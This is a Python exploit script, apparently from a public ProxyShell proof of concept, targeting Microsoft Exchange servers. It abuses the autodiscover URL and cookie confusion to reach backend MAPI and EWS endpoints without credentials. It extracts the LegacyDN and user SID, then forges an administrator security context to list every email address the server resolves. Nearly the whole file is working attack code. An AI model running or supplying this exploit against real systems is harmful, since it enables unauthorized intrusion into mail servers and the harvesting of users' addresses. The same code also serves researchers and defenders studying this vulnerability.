#!/usr/bin/env python3
#
# https://github.com/dmaasland/proxyshell-poc

import argparse
import base64
import struct
import random
import string
import requests
import threading
import sys
import time
import xml.etree.ElementTree as ET

from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


class ProxyShell:

    def __init__(self, exchange_url, email, verify=False):

        self.exchange_url = exchange_url if exchange_url.startswith(
            'https://') else f'https://{exchange_url}'
        self.email = email
        self.rand_email = f'{rand_string()}@{rand_string()}.{rand_string(3)}'
        self.sid = None
        self.domain_sid = None
        self.legacydn = None
        self.rand_subj = rand_string(16)

        self.session = requests.Session()
        self.session.verify = verify
        self.session.headers = {
            'Cookie': f'Email=autodiscover/autodiscover.json?a={self.rand_email}'
        }

    def post(self, endpoint, data, headers={}):

        url = f'{self.exchange_url}/autodiscover/autodiscover.json?a={self.rand_email}{endpoint}'
        r = self.session.post(
            url=url,
            data=data,
            headers=headers
        )
        return r

    def get_sid(self):

        data = self.legacydn
        data += '\x00\x00\x00\x00\x00\xe4\x04'
        data += '\x00\x00\x09\x04\x00\x00\x09'
        data += '\x04\x00\x00\x00\x00\x00\x00'

        headers = {
            "X-Requesttype": 'Connect',
            "X-Clientinfo": '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
            "X-Clientapplication": 'Outlook/15.0.4815.1002',
            "X-Requestid": '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
            'Content-Type': 'application/mapi-http'
        }

        r = self.post(
            '/mapi/emsmdb',
            data,
            headers
        )

        self.sid = r.text.split("with SID ")[1].split(
            " and MasterAccountSid")[0]
        self.domain_sid = '-'.join(self.sid.split('-')[:-1])

    def get_legacydn(self):

        data = self.autodiscover_body()
        headers = {'Content-Type': 'text/xml'}
        r = self.post(
            '/autodiscover/autodiscover.xml',
            data,
            headers
        )

        try:
            autodiscover_xml = ET.fromstring(r.content)
            self.legacydn = autodiscover_xml.find(
                '{*}Response/{*}User/{*}LegacyDN'
            ).text
        except AttributeError:
            print('Wrong email? Not vulnerable?')
            raise()

    def autodiscover_body(self):

        autodiscover = ET.Element(
            'Autodiscover',
            xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006'
        )

        request = ET.SubElement(autodiscover, 'Request')
        ET.SubElement(request, 'EMailAddress').text = self.email
        ET.SubElement(
            request, 'AcceptableResponseSchema').text = 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'

        return ET.tostring(
            autodiscover,
            encoding='unicode',
            method='xml'
        )


def rand_string(n=5):

    return ''.join(random.choices(string.ascii_lowercase, k=n))


def exploit(proxyshell):

    proxyshell.get_legacydn()
    print(f'LegacyDN: {proxyshell.legacydn}')

    proxyshell.get_sid()
    print(f'SID: {proxyshell.sid}')


def get_args():

    parser = argparse.ArgumentParser(description='ProxyShell example')
    parser.add_argument('-u', help='Exchange URL', required=True)
    parser.add_argument('-d', help='Email domain')
    return parser.parse_args()


def get_emails(proxyshell):

    data = f'''
        <soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
    <t:SerializedSecurityContext>
      <t:UserSid>{proxyshell.domain_sid}-500</t:UserSid>
      <t:GroupSids>
        <t:GroupIdentifier>
          <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
        </t:GroupIdentifier>
      </t:GroupSids>
    </t:SerializedSecurityContext>
  </soap:Header>
 <soap:Body>
    <m:ResolveNames ReturnFullContactData="true">
      <m:UnresolvedEntry>SMTP:</m:UnresolvedEntry>
    </m:ResolveNames>
  </soap:Body>

</soap:Envelope>
    '''

    headers = {
        'Content-Type': 'text/xml'
    }

    r = proxyshell.post(
        f'/EWS/exchange.asmx',
        data=data,
        headers=headers
    )

    email_xml = ET.fromstring(r.content)
    emails = email_xml.findall(
        '{*}Body/{*}ResolveNamesResponse/{*}ResponseMessages/{*}ResolveNamesResponseMessage/{*}ResolutionSet/{*}Resolution/{*}Mailbox/{*}EmailAddress'
    )

    for email in emails:
        print(f'Found address: {email.text}')


def main():
    args = get_args()
    exchange_url = args.u
    domain = args.d if args.d else '.'.join(
        exchange_url.split('.')[-2::]).rstrip('/')

    proxyshell = ProxyShell(
        exchange_url,
        f'FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@{domain}'
    )

    exploit(proxyshell)
    get_emails(proxyshell)


if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning
    )
    if not (sys.version_info.major == 3 and sys.version_info.minor >= 8):
        print("This script requires Python 3.8 or higher!")
        print("You are using Python {}.{}.".format(
            sys.version_info.major, sys.version_info.minor))
        sys.exit(1)
    main()
